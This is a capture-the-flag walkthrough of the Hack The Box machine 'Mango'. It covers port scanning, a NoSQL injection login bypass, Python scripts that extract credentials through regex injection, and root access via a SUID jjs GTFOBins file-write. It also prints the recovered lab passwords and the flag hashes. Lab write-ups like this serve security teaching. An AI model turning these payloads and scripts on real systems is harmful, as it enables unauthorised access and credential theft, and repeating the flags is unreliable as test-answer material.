# Mango HTB Walkthrough

## 📋 Overview
Mango is a medium-difficulty Hack The Box machine that involves NoSQL injection, credential brute-forcing, and privilege escalation through JavaScript engine exploitation.

**Difficulty**: Medium  
**Points**: 30  
**Operating System**: Linux

---

## 🎯 Reconnaissance

### Initial Enumeration

```bash
export target=10.129.229.185
```

<img width="441" height="200" alt="image" src="https://github.com/user-attachments/assets/9811270a-7a72-4baf-94d4-990ba2adbb90" />

#### Port Scan
```bash
sudo nmap -p- --min-rate 5000 -sT -vvv $target
```

<img width="897" height="734" alt="image" src="https://github.com/user-attachments/assets/11b75aa9-3f86-4d50-9652-d170b88491bc" />


**Discovered Open Ports**:
- **22** - SSH
- **80** - HTTP
- **443** - HTTPS

#### Service Version Detection
```bash
sudo nmap -p 22,80,443 -sC -sV -T4 $target
```

<img width="954" height="544" alt="image" src="https://github.com/user-attachments/assets/5602bd7c-8645-4501-a6bb-eba7fb1f727a" />


**Key Discovery**: The scan revealed `staging-order.mango.htb` as a virtual host.

#### Host Configuration
Add to `/etc/hosts`:
```
10.129.229.185 staging-order.mango.htb
```

<img width="556" height="169" alt="image" src="https://github.com/user-attachments/assets/35733877-1cf9-45b1-b7dd-3bc567688509" />


---

## 🔍 Initial Access

### Web Application Analysis

Visiting `http://staging-order.mango.htb` presents a login page. Traditional SQL injection attempts proved unsuccessful, leading to testing for NoSQL injection vulnerabilities.

<img width="717" height="827" alt="image" src="https://github.com/user-attachments/assets/ed2abf5f-d5e1-43fe-80c8-a6bef1ddf805" />


### NoSQL Injection Exploitation

#### Initial Bypass
Intercepting the login request in Burp Suite and modifying the parameters:

```http
POST / HTTP/1.1
Host: staging-order.mango.htb
Content-Type: application/x-www-form-urlencoded

username[$ne]=admin&password[$ne]=password&login=login
```

<img width="592" height="505" alt="image" src="https://github.com/user-attachments/assets/e1a75505-36b1-4159-970e-285dad045692" />

This payload successfully bypassed authentication, revealing the application was vulnerable to NoSQL injection.

<img width="592" height="505" alt="image" src="https://github.com/user-attachments/assets/ca75f48e-3b9d-4f97-bb02-fdcbf3de3182" />


#### Username Enumeration

**Python Script for Username Brute-Force**:
```python
import requests
import string
import sys

def brute_user(user_prefix=""):
    for char in string.ascii_letters + string.digits:
        payload = user_prefix + char
        sys.stdout.write(f"\r[+] Trying username: {payload}")
        sys.stdout.flush()
        
        response = requests.post(
            'http://staging-order.mango.htb/',
            data={
                'username[$regex]': f'^{payload}',
                'password[$ne]': 'password',
                'login': 'login'
            }
        )
        
        if "We just started farming" in response.text:
            print(f"\n[+] Found partial username: {payload}")
            brute_user(payload)
            return
    
    if user_prefix:
        print(f"\n[+] Complete username found: {user_prefix}")

if __name__ == "__main__":
    brute_user("")
```

**Discovered Usernames**:
- `admin`
- `mango`

<img width="657" height="320" alt="image" src="https://github.com/user-attachments/assets/ae0cd350-0600-404a-9ec7-c5efad3e737e" />

<img width="657" height="320" alt="image" src="https://github.com/user-attachments/assets/ee6d47e8-febf-4207-9a26-1a21ca81641e" />

**Note:To bruteforce the usernames we are using the nosql injection I have just used the requests package and made a request to the website and with the payload ^{user_prefix+char} trying whether the username starts with a,b,c note that to get the username starting with m we need to call the function as brute_user("m") How did m appear as first letter is that we tested in burp the first character using sniper attack by using the payload as ^a,^b...^z the intruder sniper request is below**

#### Password Extraction

**Python Script for Password Brute-Force**:
```python
import requests
import string
import sys

def brute_pass(user, pass_prefix=""):
    found = False
    for char in string.ascii_letters + string.digits + string.punctuation:
        if char not in ['+', '.', '*', '?', '|', '\\']:
            payload = pass_prefix + char
            sys.stdout.write(f"\r[+] Trying password: {payload}")
            sys.stdout.flush()
            
            response = requests.post(
                'http://staging-order.mango.htb/',
                data={
                    'username': f'{user}',
                    'password[$regex]': f'^{payload}',
                    'login': 'login'
                }
            )
            
            if "We just started farming" in response.text:
                found = True
                brute_pass(user, payload)
                return
    
    if not found and pass_prefix:
        print(f"\n[+] For user: {user} Found password: {pass_prefix}")

if __name__ == "__main__":
    brute_pass("admin", "")
    brute_pass("mango", "")
```

<img width="412" height="208" alt="image" src="https://github.com/user-attachments/assets/a8ce1b95-9926-4ac0-a6e7-e87ed57619cc" />

<img width="657" height="87" alt="image" src="https://github.com/user-attachments/assets/f35ecebb-d8a0-4ea2-81ea-7576ac1aeec0" />

**Note:ignoring $ as it indicates the end char**

**Recovered Credentials**:
- **admin**: `t9KcS3>!0B#2`
- **mango**: `h3mXK8RhU~f{]f5H`

---

## 🚀 Privilege Escalation

### Initial Access
```bash
ssh mango@10.129.229.185
```

<img width="650" height="962" alt="image" src="https://github.com/user-attachments/assets/2f9f16c6-1317-4593-bb31-fcbbbf685deb" />


### User Enumeration
Switch to admin user:
```bash
su - admin
```

Stabilize shell:
```python
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### User Flag
```bash
cat /home/admin/user.txt
```
**User Flag**: `79dfb8a4808a30feb7d431d5f4a36380`

<img width="571" height="283" alt="image" src="https://github.com/user-attachments/assets/82cc065d-0cfb-4189-ba6a-bdd78ef93d3e" />

### Privilege Escalation to Root

#### SUID Binary Discovery
```bash
find / -type f -user root -perm -4000 -ls 2>/dev/null
```

<img width="973" height="290" alt="image" src="https://github.com/user-attachments/assets/d998c13f-6966-4ecb-a95d-b98031c93969" />

**Key Finding**: `jjs` (JavaScript engine) with SUID permissions owned by root.

#### GTFOBins Exploitation
Using `jjs` for file write operations:

<img width="809" height="348" alt="image" src="https://github.com/user-attachments/assets/082bf88b-1809-493e-b849-a77dcde0a8f4" />


```javascript
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw = new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2E...");
fw.close();' | jjs
```

<img width="674" height="183" alt="image" src="https://github.com/user-attachments/assets/ae5da719-13cd-41bf-adec-acb9fa1d9789" />


#### Root Access via SSH
```bash
ssh -i private_key root@10.129.229.185
```

### Root Flag
```bash
cat /root/root.txt
```
**Root Flag**: `679984d14402f6b0e0dccf1c1fe7b9ab`

<img width="798" height="508" alt="image" src="https://github.com/user-attachments/assets/c3862faa-41ee-4821-bed1-c57d43a26e99" />

---

## 🛡️ Mitigation Strategies

1. **NoSQL Injection Prevention**
   - Implement input validation and sanitization
   - Use parameterized queries
   - Apply proper authentication mechanisms

2. **Privilege Management**
   - Remove unnecessary SUID binaries
   - Implement principle of least privilege
   - Regular security audits of system permissions

3. **Network Security**
   - Restrict SSH key-based authentication
   - Implement network segmentation
   - Regular vulnerability assessments

---

## 📚 Lessons Learned

- **NoSQL databases** are not immune to injection attacks
- **Credential brute-forcing** through regex-based injection is effective
- **SUID binaries** present significant privilege escalation risks
- **JavaScript engines** with elevated privileges can be dangerous

---

## 🔗 References

- [NoSQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html)
- [GTFOBins - jjs](https://gtfobins.github.io/gtfobins/jjs/)

---

*This walkthrough is for educational purposes only. Always ensure you have proper authorization before testing security vulnerabilities.*
<style> body { background-color: #0a0a0a; color: #ffffff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; margin: 0; padding: 20px; } .container { max-width: 1200px; margin: 0 auto; background: #1a1a1a; padding: 30px; border-radius: 10px; border: 1px solid #333; } h1, h2, h3 { color: #00ff00; border-bottom: 2px solid #333; padding-bottom: 10px; } h1 { text-align: center; color: #00ff00; font-size: 2.5em; margin-bottom: 30px; } .header-section { text-align: center; margin-bottom: 40px; padding: 20px; background: #151515; border-radius: 8px; border-left: 4px solid #00ff00; } .difficulty-badge { display: inline-block; padding: 5px 15px; background: #ffa500; color: #000; border-radius: 20px; font-weight: bold; margin: 10px 0; } .severity-badge { display: inline-block; padding: 5px 15px; background: #ff4444; color: #fff; border-radius: 20px; font-weight: bold; margin-left: 10px; } .tech-tag { background: #333; color: #00ff00; padding: 4px 12px; border-radius: 15px; font-size: 0.9em; margin: 5px 5px 5px 0; display: inline-block; border: 1px solid #00ff00; } /* Target only code blocks with triple backticks and bash */ pre { background: #ffffff; border: 1px solid #333; border-left: 4px solid #00ff00; padding: 15px; overflow-x: auto; margin: 20px 0; border-radius: 5px; color: #000000; } /* Make sure code inside pre inherits the BLACK text color */ pre code { color: #000000; background: transparent; font-family: 'Courier New', monospace; } /* Inline code (single backticks) */ code { color: #00ff00; background: #151515; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; } .image-container { text-align: center; margin: 20px 0; padding: 10px; background: #151515; border-radius: 8px; border: 1px solid #333; } .image-container img { max-width: 100%; height: auto; border: 1px solid #444; border-radius: 5px; } .vulnerability-list { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #ff4444; margin: 20px 0; } .vulnerability-list li { margin: 10px 0; padding-left: 10px; } .attack-chain { background: #151515; padding: 20px; border-radius: 8px; border-left: 4px solid #007bff; margin: 20px 0; } .tools-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; } .tool-item { background: #151515; padding: 15px; border-radius: 8px; text-align: center; border: 1px solid #333; } .tool-item:hover { border-color: #00ff00; transform: translateY(-2px); transition: all 0.3s ease; } /* Scrollbar Styling */ ::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-track { background: #1a1a1a; } ::-webkit-scrollbar-thumb { background: #00ff00; border-radius: 4px; } ::-webkit-scrollbar-thumb:hover { background: #00cc00; } /* Responsive Design */ @media (max-width: 768px) { .container { padding: 15px; margin: 10px; } h1 { font-size: 2em; } .tools-grid { grid-template-columns: 1fr; } } /* Animation for headers */ h2, h3 { position: relative; } h2::after, h3::after { content: ''; position: absolute; bottom: -2px; left: 0; width: 0; height: 2px; background: #00ff00; transition: width 0.3s ease; } h2:hover::after, h3:hover::after { width: 100%; } </style>
